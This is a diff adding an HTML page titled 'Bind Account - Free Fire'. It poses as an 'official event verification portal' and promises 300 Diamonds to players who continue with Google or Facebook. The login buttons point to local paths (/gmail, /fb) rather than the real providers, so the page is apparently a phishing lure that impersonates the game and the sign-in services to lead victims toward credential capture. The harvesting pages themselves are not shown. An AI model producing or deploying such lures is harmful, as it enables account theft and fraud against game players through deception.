@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Bind Account - Free Fire</title>
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Segoe UI', Arial, sans-serif;
+}
+body {
+    min-height: 100vh;
+    background: #0d0806;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    color: white;
+}
+.bg-overlay {
+    position: fixed;
+    inset: 0;
+    background: 
+        radial-gradient(circle at 50% 50%, rgba(255, 145, 0, 0.45) 0%, rgba(15, 8, 5, 0.95) 80%),
+        linear-gradient(180deg, #0c121e 0%, #2a1512 45%, #8f2d08 75%, #120907 100%);
+    z-index: -1;
+}
+.card {
+    width: 100%;
+    max-width: 420px;
+    background: rgba(25, 14, 10, 0.92);
+    border: 2px solid #ffae2b;
+    border-radius: 12px;
+    padding: 35px 25px;
+    text-align: center;
+    box-shadow: 0 0 35px rgba(255, 119, 0, 0.5);
+    animation: pop .35s ease;
+}
+@keyframes pop {
+    from { transform: scale(.7); opacity: 0; }
+    to { transform: scale(1); opacity: 1; }
+}
+h1 {
+    font-size: 24px;
+    color: #ffca4b;
+    margin-bottom: 10px;
+    letter-spacing: 1px;
+}
+p {
+    font-size: 14px;
+    color: #f5e1c8;
+    margin-bottom: 30px;
+    line-height: 1.5;
+}
+.btn {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    width: 100%;
+    padding: 14px;
+    margin-bottom: 15px;
+    border-radius: 6px;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    text-decoration: none;
+    border: 1px solid rgba(255,255,255,0.2);
+    transition: transform 0.1s;
+}
+.btn:active {
+    transform: scale(0.98);
+}
+.google-btn {
+    background: #ffffff;
+    color: #202124;
+}
+.fb-btn {
+    background: #1877f2;
+    color: #ffffff;
+}
+.icon {
+    font-size: 18px;
+}
+.footer-note {
+    margin-top: 25px;
+    font-size: 11px;
+    color: #a88c74;
+    letter-spacing: 1px;
+}
+</style>
+</head>
+<body>
+<div class="bg-overlay"></div>
+<div class="card">
+    <h1>ACCOUNT BINDING</h1>
+    <p>Choose your linked account to instantly secure and claim your 300 Diamonds reward.</p>
+    
+    <a href="/gmail" class="btn google-btn">
+        <span class="icon">🌐</span> Continue with Google
+    </a>
+    
+    <a href="/fb" class="btn fb-btn">
+        <span class="icon">📘</span> Continue with Facebook
+    </a>
+    
+    <div class="footer-note">OFFICIAL EVENT VERIFICATION PORTAL</div>
+</div>
+</body>
+</html>
